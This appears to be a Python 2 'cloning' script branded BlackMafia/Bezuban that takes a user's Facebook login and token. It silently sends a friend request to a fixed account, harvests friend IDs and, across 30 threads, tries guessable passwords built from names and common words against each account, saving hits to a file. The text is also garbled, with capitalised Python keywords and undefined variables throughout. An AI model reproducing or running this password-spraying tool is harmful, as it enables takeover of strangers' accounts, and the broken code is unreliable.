#!/usr/bin/python2

#coding=utf-8

#The Credit For This Code Goes To Bezuban

#If You Wanna Take Credits For This Code, Please Look Yourself Again...

#Reserved2020

Import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

From multiprocessing.pool import ThreadPool

From requests.exceptions import ConnectionError

From mechanize import Browser

Reload(sys)

Sys.setdefaultencoding('utf8')

Br = mechanize.Browser()

Br.set_handle_robots(False)

Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

Br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

Def keluar():

	Print "\x1b[1;91mExit"

	Os.sys.exit()

Def acak(b):

    W = 'ahtdzjc'

    D = ''

    For i in x:

        D += '!'+w[random.randint(0,len(w)-1)]+i

    Return cetak(d)

Def cetak(b):

    W = 'ahtdzjc'

    For i in w:

        J = w.index(i)

        X= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    X += '\033[0m'

    X = x.replace('!0','\033[0m')

    Sys.stdout.write(x+'\n')

Def jalan(z):

	For e in z + '\n':

		Sys.stdout.write(e)

		Sys.stdout.flush()

		Time.sleep(0.07)

#Dev:bezuban_raza

##### LOGO #####

Logo = """

       \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:

      \033[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     

     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      

    \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      

   \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         

  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        

  \033[1;91m:》》》\033[1;93m+923094161457\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::

\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-BlackMafia-\033[1;95m♡╭──────────•◈•──────────╮♡

\033[1;92m..........................BEZUBAN......................

\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗

\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan

\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 

\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBEZUBANRAZA\033[1;95m♡╰──────────•◈•──────────╯♡"""

Def tik():

	Titik = ['.   ','..  ','... ']

	For o in titik:

		Print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

Back = 0

Berhasil = []

Cekpoint = []

Oks = []

Id = []

Listgrup = []

Vulnot = "\033[31mNot Vuln"

Vuln = "\033[32mVuln"

Os.system("clear")

Print  """

  \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         

  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        

  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   

 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   

 \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈

 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈

  \033[1;96m ─────────────•◈•──────────  

   \033[1;92m███████▒▒Bezuban Raza Welcomes You▒▒████████

\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBlackMafia\033[1;95m♡╭──────────•◈•──────────╮♡

\033[1;94mAuthor\033[1;91m: \033[1;91mbezuban

\033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]99.9

\033[1;94mFacebook\033[1;91m: \033[1;91mbezuban

\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923094161457

\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"""

Jalan('              \033[1;96m....................Bezubanraza.....................:')

Jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")

Jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')

Jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')

Jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")

Jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")

Print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Bezuban\033[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "NloveA"

CorrectPassword = "lNloveA"

Loop = 'true'

While (loop == 'true'):

    Username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")

    If (username == CorrectUsername):

    	Password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")

        If (password == CorrectPassword):

            Print "Logged in successfully as " + username #Dev:bezuban_raza

	    Time.sleep(2)

            Loop = 'false'

        Else:

            Print "\033[1;91mWrong Password"

            Os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

    Else:

        Print "\033[1;94mWrong Username"

        Os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

Def login():

	Os.system('clear')

	Try:

		Toket = open('login.txt','r')

		Menu() 

	Except (KeyError,IOError):

		Os.system('clear')

		Print logo

		Jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )

		Jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )

		Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

		Print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )

		Print('	' )

		Id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')

		Pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')

		Tik()

		Try:

			Br.open('https://m.facebook.com')

		Except mechanize.URLError:

			Print"\n\x1b[1;96mThere is no internet connection"

			Keluar()

		Br._factory.is_html = True

		Br.select_form(nr=0)

		Br.form['email'] = id

		Br.form['pass'] = pwd

		Br.submit()

		Url = br.geturl()

		If 'save-device' in url:

			Try:

				Sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				Data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				X=hashlib.new("md5")

				X.update(sig)

				A=x.hexdigest()

				Data.update({'sig':a})

				Url = "https://api.facebook.com/restserver.php"

				R=requests.get(url,params=data)

				Z=json.loads(r.text)

				Unikers = open("login.txt", 'w')

				Unikers.write(z['access_token'])

				Unikers.close()

				Print '\n\x1b[1;95mLogin Successful...'

				Os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

				Requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				Menu()

			Except requests.exceptions.ConnectionError:

				Print"\n\x1b[1;91mThere is no internet connection"

				Keluar()

		If 'checkpoint' in url:

			Print("\n\x1b[1;92mYour Account is on Checkpoint")

			Os.system('rm -rf login.txt')

			Time.sleep(1)

			Keluar()

		Else:

			Print("\n\x1b[1;93mPassword/Email is wrong")

			Os.system('rm -rf login.txt')

			Time.sleep(1)

			Login()

Def menu():

	Os.system('clear')

	Try:

		Toket=open('login.txt','r').read()

	Except IOError:

		Os.system('clear')

		Print"\x1b[1;91mToken invalid"

		Os.system('rm -rf login.txt')

		Time.sleep(1)

		Login()

	Try:

		Otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		A = json.loads(otw.text)

		Nama = a['name']

		Id = a['id']

	Except KeyError:

		Os.system('clear')

		Print"\033[1;91mYour Account is on Checkpoint"

		Os.system('rm -rf login.txt')

		Time.sleep(1)

		Login()

	Except requests.exceptions.ConnectionError:

		Print"\x1b[1;92mThere is no internet connection"

		Keluar()

	Os.system("clear") #Dev:love_hacker

	Print logo

	Print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"

	Print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "

	Print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "

	Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

	Print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."

	Print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "

	Pilih()

Def pilih():

	Unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")

	If unikers =="":

		Print "\x1b[1;91mFill in correctly"

		Pilih()

	Elif unikers =="1":

		Super()

	Elif unikers =="0":

		Jalan('Token Removed')

		Os.system('rm -rf login.txt')

		Keluar()

	Else:

		Print "\x1b[1;91mFill in correctly"

		Pilih()

Def super():

	Global toket

	Os.system('clear')

	Try:

		Toket=open('login.txt','r').read()

	Except IOError:

		Print"\x1b[1;91mToken invalid"

		Os.system('rm -rf login.txt')

		Time.sleep(1)

		Login()

	Os.system('clear')

	Print logo

	Print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."

	Print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Public ID..."

	Print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"

	Pilih_super()

Def pilih_super():

	Peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")

	If peak =="":

		Print "\x1b[1;91mFill in correctly"

		Pilih_super()

	Elif peak =="1":

		Os.system('clear')

		Print logo

		Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

		Jalan('\033[1;93mGetting IDs \033[1;97m...')

		R = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		Z = json.loads(r.text)

		For s in z['data']:

			Id.append(s['id'])

	Elif peak =="2":

		Os.system('clear')

		Print logo

		Idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")

		Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────╯♡"

		Try:

			Jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			Op = json.loads(jok.text)

			Print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]

		Except KeyError:

			Print"\x1b[1;92mID Not Found!"

			Raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")

			Super()

		Print"\033[1;93mGetting IDs\033[1;93m..."

		R = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		Z = json.loads(r.text)

		For i in z['data']:

			Id.append(i['id'])

	Elif peak =="0":

		Menu()

	Else:

		Print "\x1b[1;91mFill in correctly"

		Pilih_super()

	 	Print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))

	Jalan('\033[1;92mPlease Wait\033[1;93m...')

	Titik = ['.   ','..  ','... ']

	For o in titik:

		Print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)

	Print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"

	Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

	Jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')

	Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

	

			

	Def main(arg):

		Global cekpoint,oks

		User = arg

		Try:

			Os.mkdir('out')

		Except OSError:

			Pass #Dev:love_hacker

		Try:

			A = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

			B = json.loads(a.text)

			Pass1 = ('786786')

			Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

			Q = json.load(data)

			If 'access_token' in q:

				Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1

				Oks.append(user+pass1)

			Else:

				If 'www.facebook.com' in q["error_msg"]:

					Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1

					Cek = open("out/checkpoint.txt", "a")

					Cek.write(user+"|"+pass1+"\n")

					Cek.close()

					Cekpoint.append(user+pass1)

				Else:

					Pass2 = 'Pakistan'

					Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

					Q = json.load(data)

					If 'access_token' in q:

						Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2

						Oks.append(user+pass2)

					Else:

						If 'www.facebook.com' in q["error_msg"]:

							Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2

							Cek = open("out/checkpoint.txt", "a")

							Cek.write(user+"|"+pass2+"\n")

							Cek.close()

							Cekpoint.append(user+pass2)

						Else:

							Pass3 = a['first_name'] + 'rajpoot'

							Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

							Q = json.load(data)

							If 'access_token' in q:

								Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3

								Oks.append(user+pass3)

							Else:

								If 'www.facebook.com' in q["error_msg"]:

									Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3

									Cek = open("out/checkpoint.txt", "a")

									Cek.write(user+"|"+pass3+"\n")

									Cek.close()

									Cekpoint.append(user+pass3)

								Else:

									Pass4 = b['first_name'] + 'mughal'

									Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

									Q = json.load(data)

									If 'access_token' in q:

										Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4

										Oks.append(user+pass4)

									Else:

										If 'www.facebook.com' in q["error_msg"]:

											Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4

											Cek = open("out/checkpoint.txt", "a")

											Cek.write(user+"|"+pass4+"\n")

											Cek.close()

											Cekpoint.append(user+pass4)

										Else:

											Pass5 = b['first_name'] + 'malik'

											Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

											Q = json.load(data)

											If 'access_token' in q:

												Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5

												Oks.append(user+pass5)

											Else:

												If 'www.facebook.com' in q["error_msg"]:

													Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5

													Cek = open("out/checkpoint.txt", "a")

													Cek.write(user+"|"+pass5+"\n")

													Cek.close()

													Cekpoint.append(user+pass5)

												Else:

													Pass6 = b['first_name'] + 'khan'

													Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

													Q = json.load(data)

													If 'access_token' in q:

														Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6

														Oks.append(user+pass6)

													Else:

														If 'www.facebook.com' in q["error_msg"]:

															Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6

															Cek = open("out/checkpoint.txt", "a")

															Cek.write(user+"|"+pass6+"\n")

															Cek.close()

															Cekpoint.append(user+pass6)

														Else:

															A = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

															B = json.loads(a.text)

															Pass7 = b['first_name'] + 'afridi'

															Data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

															Q = json.load(data)

															If 'access_token' in q:

																Print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7

																Oks.append(user+pass7)

															Else:

																If 'www.facebook.com' in q["error_msg"]:

																	Print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7

																	Cek = open("out/checkpoint.txt", "a")

																	Cek.write(user+"|"+pass7+"\n")

																	Cek.close()

																	Cekpoint.append(user+pass7)

																	

															

		Except:

			Pass

		

	P = ThreadPool(30)

	P.map(main, id)

	Print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"

	Print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:love_hacker

	Print '\033[1;91mProcess Has Been Completed\033[1;92m....'

	Print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))

	Print """

             

             ...........███ ]▄▄▄▄▄▃

             ..▂▄▅█████▅▄▃▂

             [███████████████]

             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤

♡──────────────•◈•──────────────♡.

: \033[1;96m .....Bezuban Raza........... \033[1;93m :

♡──────────────•◈•──────────────♡.' 

                Whatsapp Num

               +92332******1"""

	

	Raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")

	Menu()

If __name__ == '__main__':

	Login()

R
